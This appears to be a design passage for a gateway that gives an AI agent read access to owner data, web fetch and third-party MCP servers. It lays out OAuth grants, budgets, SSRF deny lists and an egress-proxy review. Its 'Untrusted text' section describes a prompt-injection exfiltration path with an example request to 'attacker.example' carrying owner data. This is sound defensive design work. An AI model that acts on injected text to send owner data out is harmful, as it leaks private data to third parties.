# What Main can reach: TinyCloud MCP, the web, owner-added MCP servers

Details: TC-2808 (follow-on to [`tiny-bots-slice1.md`](tiny-bots-slice1.md)). Design only: nothing here is built.

## Goal

Today Main can only talk to its model. It cannot read the owner's data, search the web, read a page or use any tool,
which makes it a chat box. This plan gives it three capabilities, each opt-in per owner, built in this order:

1. the owner's own TinyCloud data, read only, through the hosted MCP (`https://mcp.tinycloud.xyz/mcp`);
2. web search and page fetch, done by the gateway;
3. remote MCP servers the owner adds themselves.

All three follow the same rules: the sandbox never holds a credential and never has a network, the gateway holds
every credential and makes every outside call, the owner sees and controls each one, each has budgets, the audit log
holds counts and never content, and the owner can turn each off at any time. For TinyCloud data, turning it off ends
Main's use of the access, not the delegation underneath, until decision 2 (section 2).

## Today

- The sandbox runs under gVisor with `--network=none`. Its only way out is its own Unix socket, bridged to
  `127.0.0.1:8080` inside the sandbox (`bots/sandbox/bot-start.sh`).
- `bots-gateway` accepts only `POST /v1/chat/completions` and `GET /v1/models` on that socket, with the bot's own token,
  and forwards to the fixed origin `https://tee.redpill.ai` with the model key it alone holds (`bots/README.md`).
  A bot is registered with the gateway over its admin socket (`PUT /bots/<botId>`); registrations do not survive a
  gateway restart.
- OMP in the sandbox has no MCP server configured.
- Hosted MCP facts this design relies on (js-sdk `packages/mcp` and OpenKey `docs/resource-server-token-status.md`):
  - An OAuth access token for `https://mcp.tinycloud.xyz/mcp` lasts 12 hours (OpenKey #417, TC-1366); refresh tokens
    last 7 days; a connection ends at the 30-day sign-in cap. The scope is `tinycloud:mcp`.
  - The MCP checks every token with OpenKey's token-status endpoint and reuses an active answer for 30 s. If OpenKey
    cannot answer, it serves a token only if OpenKey called it active within the last 60 s. A revoked token, a withdrawn
    consent or an ended sign-in is `active: false`.
  - The token identifies the owner. Authority over data is separate: each operation needs a TinyCloud delegation the
    owner approved through OpenKey. When it is missing the tool answers `authority_required` with a short-lived approval
    link. Production requests 30-day delegations and 15-minute links (`TC_MCP_DELEGATION_EXPIRY=30d`).
  - A delegation cannot be revoked early: the MCP has no revoke route for them (TC-1156). Tokens can be revoked;
    delegations end at their expiry.
  - The owner sees and disconnects connected MCP apps on the OpenKey account page, and sees the MCP's delegation on
    `account.tinycloud.xyz/delegations`.
  - The MCP logs only the tool name, a result code, the duration and a replay count.
  - The TinyChat backend already reaches the MCP for meeting transcripts with an owner-signed, read-only grant to a
    service identity (`MCP_CHAT_*`, `backend/src/mcp-meetings`). That path accepts exactly one grant shape (the
    connectors database and prefix, read only, at most 30 days), so it cannot carry this design as it is.

## Design

### 1. The gateway is Main's one MCP server

The gateway gains one route on each bot's socket, `POST /v1/mcp`. To the sandbox it is a single MCP server (OMP's MCP
client is pointed at `http://127.0.0.1:8080/v1/mcp`; the config key is confirmed at build). Behind it the gateway
serves the tools of whatever the owner has enabled: the hosted TinyCloud MCP (sections 2 to 4), its own web tools
(Web access, below) and the owner's added servers. Tool names are namespaced (`tinycloud__kv_get`, `web__fetch`,
`<server slug>__<tool>`) so a server cannot shadow another's tool. The sandbox never names a host. The model routes,
the one-request-per-bot slot, the 4 MiB body cap and the response cap apply to this route too.

The gateway reads the JSON-RPC request and rebuilds it, as it does for chat bodies. It passes only `initialize`,
`notifications/initialized`, `ping`, `tools/list` and `tools/call`. Everything else (resources, prompts, sampling,
elicitation, roots) is answered locally with a fixed error and never sent. `tools/call` is passed only for a tool on the
bot's allowlist; `tools/list` answers are rebuilt from that list. The gateway owns every upstream MCP session id and
`Authorization` header; the sandbox sees neither. The only hosts the gateway ever calls for a bot are: the model
origin, `mcp.tinycloud.xyz/mcp` (phase 1), the search provider and guarded page fetches (phase 2), and the owner's
servers (phase 3).

`GET` (the SSE stream) and `DELETE` on `/v1/mcp` are refused (405), so the sandbox cannot open a server-to-client stream
or end a session. The gateway strips `Mcp-Session-Id` from every reply.

### 2. Who holds the grant

Two things are involved and they must not be confused. The **token** is an OpenKey OAuth access token (and, for a
standing grant, its refresh token) for the owner, kept in the gateway, outside the sandbox, like the model key. The
**delegation** behind it (the authority the node checks) is held by the hosted MCP, not by the gateway.

**Precondition (decision 2, nothing below ships without it).** The hosted MCP stores delegations per tenant, and a tenant
is keyed by the OpenKey subject alone, not by OAuth client or audience (js-sdk `packages/mcp`, `remote-store.ts`
tenant id, and the identity read in `http.ts`). So on `/mcp`:
- Main would use any delegation the owner approved for another MCP client (a chat app, a desktop client) without an
  approval for Main; and
- whatever Main's flow approves becomes usable by those clients.

"You pick what Main can read" is not enforced by anything under that keying, and the gateway's tool list does not
limit scope. Main therefore needs either its own restricted MCP address with separate tenant state (the pattern the
restricted per-client addresses use), or an MCP that keys tenants by subject and client. Whether the existing
restricted surfaces expose the read tools Main needs is to be confirmed; a new surface may be needed.

- It gets to the gateway once, at approval. The owner approves in OpenKey in their browser and the TinyChat backend
  receives the authorization code. The OAuth flow is bound to the person and the bot:
  - PKCE is required, and `state` is a single-use value the backend stores server-side with a short life, tied to the
    signed-in TinyChat user and the `botId`. The callback is rejected if `state` is missing, reused, expired, or does not
    match that user and bot.
  - The backend passes the code, the PKCE verifier and the expected OpenKey subject (the user's linked OpenKey
    identity) to the supervisor over the existing service-authenticated call, and the supervisor hands them to the
    gateway over its admin socket (`PUT /bots/<botId>/mcp-grant`).
  - The gateway does the code exchange, then checks that the token's subject equals the expected subject. On a
    mismatch it discards the token and the grant fails with `owner_mismatch`. Without this check a login CSRF or an
    OAuth mix-up attaches another person's token to a bot.
  - The token is first seen inside the gateway; the backend and supervisor never see, log or store it.
- A one-off grant lives only in the gateway's memory. A gateway restart ends it, which is the same as it expiring.
- A standing grant (7 days, renewing) must survive a restart, so the gateway writes its refresh token to its own volume,
  encrypted (AES-GCM, key from the gateway's environment like the model key), mode 0600.
- The sandbox, the supervisor and the saved bot state never hold the token. The gateway removes the `Authorization`
  header and any token from everything it returns, and it strips the approval link from an `authority_required` result
  (the link goes to the owner through the supervisor's event stream, section 3, never to the model).
- Windows the owner picks:
  - **One-off**: 1 hour at most, for one task, no renewal. The gateway ends it when Main's turn settles or after 1
    hour, whichever is first.
  - **Standing**: 7 days, renewing, only if the owner picks it, and only after a warning screen. No default, no nudge.
  - The extra warning and "Reject this permission" for another app's data or cross-app access are OpenKey's to build
    (decision 1). The MCP's delegation approval goes through OpenKey's `/delegate` link flows, which show no such
    screen today, and the draft that adds it (#538) does not cover them (its security review confirmed that ticket and
    link flows skip both the warning and the share rule). This plan depends on it and does
    not rely on it existing.
- **What these windows bound today.** The gateway enforces them on the token only: it stops attaching the token and
  revokes it at OpenKey. The delegation underneath lasts as long as the MCP's delegation expiry (30 days in
  production), cannot be revoked early (TC-1156), and lives in the MCP, so ending the token does not end it. Until
  decision 2 gives a per-request expiry (or Main's own address with its own shorter delegation), the 1-hour and 7-day
  windows are token-only, and no owner-facing line may say the access ends at 1 hour or after 7 days.
- The access token is valid at the MCP for up to 12 hours whatever the grant says, so revoking it at OpenKey (section
  3) matters even when the gateway has already stopped using it.

### 3. Limits, budgets, audit, revoke, what the owner sees

**Tools.** Phase 1 is read-only. The allowlist is the hosted tools whose only effect is `read`, minus the ones that mint
authority or return secrets:

- exposed: `tinycloud_kv_get`, `tinycloud_kv_head`, `tinycloud_kv_list`, `tinycloud_sql_query`,
  `tinycloud_sql_schema_inspect`, `tinycloud_read`, `tinycloud_knowledge_list`, `tinycloud_knowledge_read`,
  `tinycloud_apps_read`, `tinycloud_account_spaces_list`, `tinycloud_status`;
- not exposed, ever: `tinycloud_auth_request`, `tinycloud_auth_read_scope`, `tinycloud_connect`, `tinycloud_secrets_get`
  (secrets stay on their own short-lived policy);
- not exposed in phase 1 (writes, or reads with a side effect): `tinycloud_kv_put`, `tinycloud_kv_delete`,
  `tinycloud_sql_execute`, `tinycloud_apps_write`, `tinycloud_apps_query`, `tinycloud_apps_context`,
  `tinycloud_account_applications_list`. A write phase needs its own plan and its own approval copy.

**Once decision 2 is built**, the delegation is the real limit: the owner picks the space and prefixes or databases when
approving, and the node refuses anything outside them. Until then it is not: under the shared tenant, delegations the
owner approved for other MCP clients are usable by Main (section 2), so the gateway's list and budgets are the only
limit Main has, and nothing in this design ships without decision 2. The gateway's list is a second layer, not the
first. Build confirms that
`tinycloud_sql_query` is held read-only by the node's delegation (a read-only database permission) and not only by the
tool's name.

**Budgets** (starting values, tuned after the first run): per task, 30 tool calls and 256 KiB of results; per bot per
day, 500 calls; one call in flight per bot; 20 s per call; results already capped by the MCP at 100,000 characters.
Results enter the model's context, so they also count against the existing per-bot and global token budgets.

**Audit.** The gateway logs counts, never content: per bot (hashed id) and day, calls by tool name and outcome
(`ok`, `tool_not_permitted`, `grant_ended`, `authority_required`, `mcp_unavailable`, `budget`), bytes returned. No
arguments, no results, no token, no approval link. The owner sees the same counts in Main's settings.

**Revoke.** Disconnect in Main's settings tells the backend, which tells the supervisor, which has the gateway delete
the in-memory grant **and the encrypted refresh-token file**, and call OpenKey's revoke for the access and refresh
tokens. The gateway checks the grant on every call, so the next call is refused. At the MCP the token is inactive within
about 30 s. The owner can also remove the connection on the OpenKey account page, which ends the token the same way.
The delegation underneath is not ended by any of this: it cannot be revoked early (TC-1156) and stays valid for the
MCP's delegation expiry (30 days in production). Until decision 2 lands, Disconnect ends Main's use of it, not its
existence.

**What the owner sees** (copy for review; every string lives in the bots strings module):

| Where | Draft |
| --- | --- |
| Main's settings, off | "TinyCloud data" / "Main can't read your TinyCloud data." / button "Let Main read it" |
| Choice sheet | **Held until decision 2 lands** (the 1-hour and 7-day lines are not yet true): "Let Main read your TinyCloud data?" / "Main can read what you pick, nothing else. It can't change anything. What it reads is sent to the AI model service to write its answer." / options "Just for this task" (selected), "For 7 days" / "You pick what Main can read" (app list, none selected) |
| After "For 7 days" | **Held until decision 2 lands:** warning screen: "Keep Main's access for 7 days?" / "Main will keep reading what you picked, and the access renews on its own, until you turn it off or 7 days pass." / "Keep it to this task" / "Allow 7 days" |
| Approval | OpenKey's own screen. No claim about an extra warning or "Reject this permission" until decision 1 ships them |
| Active | **Held until decision 2 lands** (the end time is not yet true of the delegation): "Main can read <apps> until <time>." / "Used 12 times today." / button "Disconnect" |
| Ended | "Main's access to your TinyCloud data has ended." / "Give Main access again" |

Copy goes to Monica before any of it ships. It makes no claim about encryption or about what Main may do later.

### 4. Failure modes

Each answers the model with a fixed one-line error (no upstream text) and logs a count.

| Case | What happens |
| --- | --- |
| Grant expired, revoked or gateway restarted | `grant_ended`. The model is told access ended. The supervisor sends the owner a `grant_needed` event; the "Ended" line shows. No retry loop. |
| MCP down, 5xx, timeout, or the MCP's `server_error` because OpenKey is unreachable | `mcp_unavailable`. No retry of the call. After 3 in a row the gateway refuses for 60 s. The turn goes on without the data. |
| Tool not on the allowlist | Refused locally, `tool_not_permitted`; never sent. |
| `authority_required` (Main asked for more than the owner approved) | The approval link is stripped from the result; the owner gets "Main needs more access: <what>" with a Review button that opens OpenKey. `<what>` is built by the gateway from the MCP's structured authority request (space, prefix or database, action), never from model text or the tool's message, so injected text in data Main read cannot word the request. The owner sees exactly what OpenKey will ask. Nothing is widened automatically. |
| `invalid_token` / 401 | Treated as the grant ending, as the first row. |
| Over a per-task or per-day budget, or a second call in flight | Refused, `budget`, with the body unread. |
| Oversize or malformed response | Dropped; `mcp_unavailable`. |

## Web access (phase 2)

The gateway offers two tools, `web__search` and `web__fetch`, and makes the calls itself. The sandbox has no raw
network and gets no new route beyond `/v1/mcp`.

**Search provider.** The provider key is a gateway credential, like the model key. Candidates, none chosen:
Tavily (the backend already uses it for chat web search, `backend/src/mcp-meetings/web-search.ts`, and it also has a
page-extract API), Brave Search API, Exa, Kagi, or a self-hosted SearXNG (no key, but another container to run and
upstream engines that can block it). All except SearXNG are paid keys. **No key is added until it is decided**, and the
bots service gets its own dedicated key with its own provider-side budget, not the backend's. Search queries leave the
TinyCloud trust boundary to the provider, and the owner copy must say so.

**Fetch guards.** Every fetch, and every redirect hop, goes through one guard:
- Scheme `https` or `http` only; no user info in the URL; ports 80 and 443 only; no non-HTTP schemes of any kind.
- The host is resolved by the gateway and **every** address returned is checked; the connection is then made to the
  address that was checked (not resolved again), with the original host in SNI and `Host`. That closes DNS rebinding
  only if nothing in between resolves the name again: the fetcher ignores `HTTP_PROXY`, `HTTPS_PROXY` and `NO_PROXY`
  from its environment, uses only the one outer ring this plan configures explicitly (if any), and otherwise talks to
  the target directly. A proxy placed behind the gateway would resolve the name itself and reopen
  rebinding, unless its own dial-time deny list carries the same list as below.
- Refused addresses: loopback, unspecified, private (RFC 1918), shared/CGNAT, link-local (including the cloud metadata
  address `169.254.169.254`), multicast, broadcast, reserved, IPv6 loopback/ULA/link-local, and these forms, named
  explicitly because they embed or tunnel IPv4 addresses: IPv4-mapped `::ffff:0:0/96`, IPv4-compatible `::a.b.c.d`
  (`::/96`), NAT64 `64:ff9b::/96` and the local-use `64:ff9b:1::/48`, 6to4 `2002::/16`, Teredo `2001::/32` and
  site-local `fec0::/10`. IP literals in decimal, octal or hex form are normalised before the check. Names that
  resolve into the gateway's own compose network are refused by the same rule.
- At most 3 redirects, each re-checked from the start (scheme, host, address); a redirect to a refused target ends the
  fetch.
- GET only; no cookies, no request body, a fixed `User-Agent`, and no header taken from the sandbox.
- Time: 5 s to connect, 15 s total. Size: 1 MiB of body after decompression, read as a stream and cut at the cap.
- Content types: `text/html`, `text/plain`, `text/markdown`, `application/json`, `application/xml`, `text/xml`,
  `application/xhtml+xml`. Anything else is refused, as is a body that does not match its type (for example a
  `%PDF` or image magic number behind `text/html`).
- The gateway turns HTML into plain text (scripts, styles and hidden elements dropped) and returns at most 40,000
  characters, wrapped as untrusted content (below).

**Budgets** (starting values): per task, 10 searches and 20 fetches; per bot per day, 100 searches and 300 fetches;
a global daily cap; one web call in flight per bot. Returned text also counts against the token budgets.

**Audit and owner view.** Counts by tool and outcome (`ok`, `blocked_address`, `blocked_scheme`, `too_large`,
`wrong_type`, `timeout`, `budget`), bytes returned. No query, no URL, no page text. The settings row shows "Main
searched 4 times and read 9 pages today." Blocked attempts are counted separately so a spike is visible.

**Owner control.** Web access is off by default and is a per-owner switch with two choices, "Just for this task" and
"Until I turn it off". It carries no owner credential and no owner data, so it has no expiry; the 1-hour and 7-day rules
are for owner authority. Turning it off ends it at the next call.

**Untrusted text.** Everything that comes back from the web (and from an owner-added server, below) is data, not
instructions, and the design does not rely on the model to tell the difference:
- The gateway wraps it as quoted content with a fixed label and gives it no authority; a page cannot add a tool, widen a
  grant, change an allowlist or raise a budget, because those live in the gateway and the owner's settings, not in the
  conversation.
- Grant-bearing tools (TinyCloud data, an owner's server) are still gated by their allowlist, scope, budget and
  expiry. Writes are not exposed in phase 1; a later write phase confirms each write with the owner outside the model.
- **The exfil rule: the largest risk in phase 2, and one no proxy can remove.** Once Main can read owner data and also
  fetch the open web or call an owner-added server, injected text in a page or a tool result can make it read data and
  then request `https://attacker.example/?d=<data>`, or put the data in an owner-added server's tool arguments (the same
  channel, to a third party). A search query is the same channel. An allowlist cannot stop this while fetch is
  open-ended. **The rule is about the conversation, not the task:** owner data stays in Main's context after the task
  that read it ends, so a later task with no grant-bearing call still holds it. The gateway therefore marks a bot's
  conversation as holding owner data from the first grant-bearing result, and clears the mark only when the supervisor
  tells it the conversation was reset with a fresh context (the gateway cannot see what a summary kept, so a summary
  does not clear it). While marked, exactly one of these rules applies, chosen in decision 5, to `web__fetch`,
  `web__search` and every owner-added server's tools:
  - **(a) Strict.** No open fetch and no owner-added server calls. Recommended starting point.
  - **(b) Narrowed.** Fetch only through a gateway-built search call whose query is shown to the owner or length-capped
    (200 characters), plus URLs the owner typed or a search in the same conversation returned. Owner-added server calls
    are blocked. This narrows the channel and does not close it: a query or a path can still carry a few words.
  - **(c) Owner confirms** (outside the model) each new domain before the first fetch to it, and each owner-added
    server before its first call, while marked. The first loosening to consider after (a).

## Owner-added MCP servers (phase 3)

The owner can add a remote MCP server (streamable HTTP) so Main can use its tools. Everything about a server is held
and enforced by the gateway.

**Adding one.** Settings, "Tools Main can use", "Add a tool server". The owner enters an `https` URL (no `http`, no
user info, port 443 only). The gateway, not the backend or the browser, contacts it, through the same guard as page
fetches (resolve, check every address, connect to the checked address, no redirects on MCP calls, 10 s total). It runs
`initialize` and `tools/list` and returns what the owner needs to decide: the host, the server's own name, and its
tools by name and description.

**What the owner approves, per server:**
1. the server (its host is shown exactly as it will be contacted);
2. which of its tools Main may use. None is selected by default. The server's read-only hints are shown as hints and
   never trusted;
3. how long: "Just for this task" (up to 1 hour) or "For 7 days", with the same warning screen before 7 days as for
   TinyCloud data, and no silent renewal.

**Credential.** If the server supports the MCP authorization flow (OAuth with PKCE), the owner signs in at the server's
authorization server in their browser and the gateway does the code exchange, as in section 2. The server itself names
its authorization server during discovery, so a malicious server could name a real one (GitHub, Google), the owner
would approve at a screen they trust, and the gateway would then hand that token to the malicious server. So:
- The add screen shows the authorization server's host next to the server's, and requires an explicit confirmation when
  they are different sites ("This server asks you to sign in at <host>").
- The authorization request carries the RFC 8707 `resource` parameter set to the server's exact URL, and the gateway
  attaches a token only to the resource it was issued for, never to another server or path.
- The `state` is bound to the owner and the bot, as in section 2.
If it takes a bearer key instead, the owner pastes it once into a field that posts it to the supervisor and on to the
gateway; the browser, backend and supervisor do not keep it, and request-body logging is off for that route in the
backend and the supervisor. The gateway holds it as in section 2 (memory for one task; encrypted on its volume for 7
days). The token endpoint and every URL the gateway fetches for the flow go through the same guard.

**Per-server tool allowlist and pinning.** Tools are exposed as `<slug>__<tool>`. The gateway hashes each approved
tool's name, description and input schema at approval. If the server later changes one, that tool is withheld until the
owner approves the change. Descriptions are truncated to 500 characters, schemas must be plain JSON Schema within a size
cap, and both are treated as untrusted text. A server can't add a tool to the allowlist by announcing it.

**Budgets** (starting values): at most 5 servers per owner; per server per task 20 calls and 256 KiB of results; per
server per day 300 calls; one call in flight per server; 20 s per call.

**Audit and owner view.** Counts per server, tool and outcome (`ok`, `tool_not_permitted`, `grant_ended`,
`server_changed`, `blocked_address`, `server_unavailable`, `budget`). No arguments, results, tokens or URLs. Settings
list each server with its tools, expiry and "Used 6 times today", and a "Remove" button.

**Remove and revoke.** Remove deletes the credential in the gateway, closes the upstream session (`DELETE` with the
session id), calls the server's revocation endpoint if it advertises one, and the next call is refused. A server that
does not honour revocation keeps a token that only the gateway held, until it expires.

**Failures.** The same fixed one-line errors as section 4: server unreachable or slow (no retry; 3 in a row pause the
server for 60 s), token expired (owner sees "<server> access has ended" with "Add it again"), refused address,
tool changed, over budget.

### Owner copy for review (Monica)

| Where | Draft |
| --- | --- |
| Web, off | "Web" / "Main can't search the web or read pages." / "Let Main use the web" |
| Web, choice | "Let Main use the web?" / "Main can search and read public pages. Searches go to a search provider." / "Just for this task" / "Until I turn it off" |
| Web, on | "Main can use the web." / "Searched 4 times and read 9 pages today." / "Turn off" |
| Add server | "Add a tool server" / "Paste the address of an MCP server you trust." / "Main can use the tools you allow, nothing else." |
| Server tools | "<name> (<host>)" / "Choose what Main may use" (none ticked) |
| Server, 7 days | "Keep <name> connected for 7 days?" / "Main keeps using the tools you picked until you remove it or 7 days pass." / "Keep it to this task" / "Allow 7 days" |
| Server, active | "<name> can be used until <time>." / "Used 6 times today." / "Remove" |
| Server, ended | "<name> access has ended." / "Add it again" |

## Egress layer: iron-proxy and the alternatives

Question: should the gateway's outbound traffic (all three capabilities) go through
[iron-proxy](https://github.com/paradigmxyz/iron-proxy), an open-source egress firewall for untrusted workloads?
Read from its README, config example and source (`internal/dnsguard`, `internal/mcp`, `internal/transform`) at
v0.56.0. **Nothing here was run**; every behaviour below is from reading, and the spike at the end is what would
confirm it. A separate survey of other approaches (hosted sandboxes' egress firewalls, SSRF-safe forward proxies, MCP
gateway products, what comparable agent sandboxes do) was done alongside; its findings that change this section are
summarised under "Other approaches" below and its full text is with the research notes.

### What it is

A single Go binary with one YAML config (Apache-2.0). It runs a DNS server and an HTTP/HTTPS proxy, terminates TLS with
a CA we provide (MITM), runs each request through an ordered transform pipeline (`allowlist`, `secrets`,
`header_allowlist`, `annotate`, `body_capture`, `judge`, `oauth_token`, a `grpc` hook to an external service, and
others), and logs one structured JSON audit line per request (optionally exported over OTLP). It also has a first-class
MCP policy: for Streamable HTTP it parses JSON-RPC, applies a default-deny `tools/call` allowlist with optional
argument conditions, and filters `tools/list` responses, including per SSE event.

### How it maps to what we need

| Need | iron-proxy | Fit |
| --- | --- | --- |
| Default-deny egress | `allowlist` by domain glob or CIDR; unmatched gets 403 | Good for fixed destinations (model, TinyCloud MCP, search provider). For "fetch any public page" the allowlist has to be wide open, so the deny list does the work. |
| Built-in DNS | Resolves every name to the proxy so traffic is steered through it | Not used: the sandbox has no network, and the gateway would use the proxy's HTTP/CONNECT listener. The DNS server can be switched off (`dns.enabled: false`, in the config example; a trial ran with it off; v0.42.0 did not have the switch). |
| Upstream IP deny list | `upstream_deny_cidrs`, enforced in the dialer's `Control` hook after resolution (source: `internal/dnsguard`), so a name that resolves or rebinds to a denied address is refused before the connect; IPv4-mapped IPv6 is unmapped first | Good, and it is the piece we would otherwise write ourselves. **The default list is only cloud metadata and loopback.** Any proxy behind the gateway resolves the name again, so its list must carry the same ranges as the fetch guard (Web access): `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `100.64.0.0/10` (CGNAT, which includes the operators' private overlay network), `169.254.0.0/16`, `0.0.0.0/8`, `fc00::/7`, `fe80::/10`, `fec0::/10`, multicast, and the embedded-IPv4 forms (`::/96`, `64:ff9b::/96`, `64:ff9b:1::/48`, `2002::/16`, `2001::/32`). The gateway does not follow redirects, or re-checks every hop through the proxy. With an upstream proxy configured the check applies to the proxy's address, not the target. |
| Proxy tokens swapped for real secrets | `secrets` transform: the workload sends a token, the proxy replaces it from env, file, AWS, Vault or 1Password sources, `require: true` rejects requests without it | Fits static service keys (the model key, a search key). Does not fit per-owner, short-lived tokens: sources are static, and a changed value needs a config reload (`POST /v1/reload`) or a `grpc` transform we would write. The gateway keeps per-owner grants itself (section 2). Also: the `file` source does not trim, so a trailing newline becomes part of the header, and `require: true` on a host-only rule breaks tunnelled requests (#222). Only works in MITM mode. |
| Per-request audit | JSON per request with the transform trace, secrets swapped (names and locations, not values) and rejections. No headers or bodies, and no query string in a trial run | Mixed. **Paths are logged**, and for web fetch the path is the owner's task content, so raw lines are not shipped as they are: log host only or hash the path (a filter in front of the log, or a patch), and add rotation, since there is none. It is per request, not per owner: it cannot know which bot made a call. |
| SSE / streamable HTTP | SSE is flushed per chunk, so MCP streamable HTTP over SSE works; WebSocket is HTTP/1 only | Good for MCP and model streaming. Non-SSE chunked responses (NDJSON, Connect, gRPC) are buffered until they end (an open issue, seen in a trial), and the 30 s response-header timeout needs raising for slow tool calls. |
| MCP pipeline | README for v0.56.0: per-server tool allowlist, `when` conditions on arguments, `tools/list` filtering, `mcp_gateway` routes with credential injection, audit of every JSON-RPC message. An earlier trial found no JSON-RPC awareness, so treat this as newer and unproven here | Not relied on in phases 1 and 2: the gateway's own rebuild, tool list and namespacing stay the gateway's job. Possibly useful later for owner-added servers (argument conditions). v1 limits: Streamable HTTP only, resources and prompts not enforced, a batch with one denied entry is rejected whole, static per-server YAML. |

### What it would replace in `bots-gateway`

- The outbound network code for web fetch and for MCP upstreams: the checked-address connect, the redirect re-check
  (the proxy does not follow redirects, so each hop is a new request through it) and the address deny list.
- Egress audit lines for those destinations.
- Holding static third-party keys (search provider) in the gateway: it would hold a proxy token instead. This exists
  only in MITM mode, which changes the trust (next section).

### What we still build

- Everything per bot or per owner: socket and token auth, the one-request slot, the chat body rebuild, token budgets
  and their reservation and settling, the `/v1/mcp` multiplexer and tool namespacing, grant storage, code exchange and
  refresh, call and byte budgets, owner events and counts.
- URL policy the proxy does not express: no user info, ports 80 and 443 only, scheme rules.
- Response policy: size cap, content-type limits, magic-number check, HTML to text, the untrusted-content wrapper.
- Tool pinning (name, description and schema hashes) and the owner-facing flows.
- The gateway's own SSRF guard is always built and always on, whichever hop is chosen (decision 7). A hop is an added
  outer ring, never a replacement for it.

### Two ways to place it

- **A. As the sandbox's path out** (HTTP proxy over the existing socket bridge, the proxy's CA in the sandbox rootfs).
  Rejected: it gives the sandbox raw HTTP to whatever the allowlist permits, contrary to the rule that the gateway does
  every outside call, and web fetch would run in the sandbox.
- **B. As the gateway's outer ring.** The gateway has no direct internet: it sits on a network whose only route out is
  the proxy. The proxy enforces the allowlist and the full deny list at dial time and writes the audit. The gateway
  trusts the proxy's CA only in MITM mode (next section). In MITM mode this is not a smaller-trust ring: the proxy
  joins the gateway's trust boundary. If iron-proxy is used at all, this is the placement.

### MITM or passthrough: the trust difference

- **With TLS interception (MITM), the proxy sees every token and every byte in plaintext**: owners' MCP bearer tokens,
  owner-server keys, TinyCloud data, fetched pages. Its CA can also impersonate any upstream to the gateway. So the
  proxy then holds the same trust as the gateway, not a smaller one, and the gateway is no longer the only component
  that holds both secrets and internet access.
- **With `tls.mode: sni-only` and CONNECT passthrough** there is no interception and no CA in the gateway, so the proxy
  never sees a token or a page. The host allowlist and the dial-time deny list still apply (reported from a trial of an
  older release; the spike confirms). Path, secret-swap and MCP transforms are lost, which costs little because the
  gateway already does MCP policy and holds the tokens, and static keys then stay in the gateway.
- **Leaning:** passthrough, unless the spike shows a need for interception. The spike compares both. If interception is
  kept anyway (for the secret swap or MCP transforms), the card must say so plainly: the proxy joins the gateway's trust
  boundary, it holds the CA key and sees every token and page, and any static key moved into it is exposed to the
  proxy's supply chain (one dominant maintainer, unsigned images).

### Deployment in the CVM (if iron-proxy is chosen; the same network rules apply to any dial-out hop)

- A new `bots-egress` container beside `bots-gateway` in `docker-compose.phala.yml`: unprivileged, read-only, no
  capabilities, no published port. **It does not join the existing `egress` network.** That network also holds
  `dstack-ingress`, which publishes 443 and mounts the CVM's `dstack.sock`, so any outbound component on it can reach
  ingress by its compose address. The proxy and the gateway get a dedicated network with neither ingress nor any other
  service on it, and the deny list covers the Docker subnets. The sandbox never reaches it.
- **The tunnel has no authentication** (`Proxy-Authorization` is not checked and SOCKS5 is no-auth). Anything that can
  reach its port can use it. So **`bots-gateway` is the only container that can reach `bots-egress`, now and in any
  later change**: it listens only on a network that holds the gateway and the proxy and nothing else, is never
  published, and no other service joins that network (a later service joining it, or a published port, breaks the
  rule). On a shared host a local user could otherwise use it. The spike checks that another container is refused.
- **Fail closed.** The gateway has no direct route, so if the proxy is down a fetch is refused, never sent direct.
- **Management and metrics listeners.** The management API (`/v1/reload`) is off by default; if enabled, bind it to
  loopback and keep its bearer in the proxy only. A trial found the metrics listener defaulting to `:9090` on all
  interfaces; pin it to loopback (recheck on the pinned release).
- Built from a pinned release tag by our own Dockerfile (module checksums from `go.sum`) and referenced by digest, as
  the other images are. Release signing is thin: only v0.42.0 has a GPG-signed checksum file (it lacks the DNS switch);
  later releases, including v0.56.0, carry `checksums.txt` only, and the published images are unsigned. We pin by tag,
  digest and checksum, and review the diff of every upgrade; we do not pull `latest`.
- **In MITM mode only: the CA key can impersonate any site to anything that trusts it.** It is a deploy secret held by
  the proxy only (key files mode 0600), and only the gateway trusts the CA; it is never put in the sandbox, the
  supervisor or any other image. Real static keys (a search key) may move from the gateway's environment to the
  proxy's, scoped to exact HTTPS hosts (a secret can be swapped onto plain `http://`, an open issue). Per-owner tokens
  stay in the gateway. Config is one YAML file in the image; a change is a redeploy.
- The model leg stays direct from the gateway in phase 1. Putting it through the proxy adds a TLS-terminating hop for
  prompt traffic, and the gateway code shows no certificate pinning but we have not checked what the provider's
  verification relies on. Moving it is a separate decision after the spike.

### Maturity, licence, maintenance

- Apache-2.0. The repository was created 2026-04-01 and sits under the `paradigmxyz` organisation (873 stars; 13
  contributors, but one maintainer wrote about 80% of the commits); the Go module path and release badges still say
  `ironsh`, and the maintainers publish an enterprise product (a managed control plane, dynamic Vault engines, a
  Kubernetes operator) beside it. We would use the open standalone mode only.
- Pre-1.0: v0.56.0 (2026-11-04) after releases roughly every one to three weeks, mostly from one dominant maintainer;
  the last commit we saw was 2026-11-04. Expect config and behaviour changes between releases; we pin and review each
  bump, and do not auto-update. It sits on every byte of egress, so a bad release is a bad day.
- Open issues relevant to us (52 open in all): non-SSE streams buffered; request bodies over the buffer cap truncated
  when a transform reads the body (avoid `match_body`); secrets can be swapped over plain HTTP with no way to require
  TLS (scope secrets rules to exact HTTPS hosts); dependency advisories open on an earlier release (check the pinned
  one); unsigned images; denials return an empty 403 body.
- It publishes a private vulnerability-reporting contact.
- From the survey (not rechecked): two security advisories in the last three months (a bypass of the MCP tool allowlist
  by a non-JSON content type, fixed in 0.50.0, and a PostgreSQL row-level-security bypass, fixed in 0.53.0), about 157 of
  199 commits from one author, and commit volume down from 92 in April to 3 to 12 a month since July.
- Exit: the gateway talks to it through the standard proxy environment and a CA, and keeps its own guards, so replacing
  it with our own dial guard (or Squid or Envoy) loses the outer ring and nothing else.

### Other approaches (from the survey)

- **Do not open the sandbox's network; make every capability a gateway route.** This is the choice this plan already
  makes, and the one comparable sandboxes converge on (Anthropic's sandbox runtime also removes the network namespace and
  gives the sandbox proxies on Unix sockets; hosted sandbox products put the firewall and the credentials outside the
  sandbox and key policy on sandbox identity). Our gateway already has that identity: the socket path is the bot.
- **Smokescreen** (Stripe's forward proxy) as a dial-out hop behind the gateway: resolves names and refuses non-public
  addresses by default, per-client ACLs, rate and concurrency limits, CONNECT only, no TLS interception and no secret
  handling. That is a smaller job than iron-proxy's, with no CA to guard, and it matches the one thing phase 3 needs:
  SSRF-safe dialing of arbitrary owner hosts. Not run or verified by us.
- **Fetch through the search vendor** (Tavily Extract, Exa contents): the CVM dials only the vendor's fixed host, so
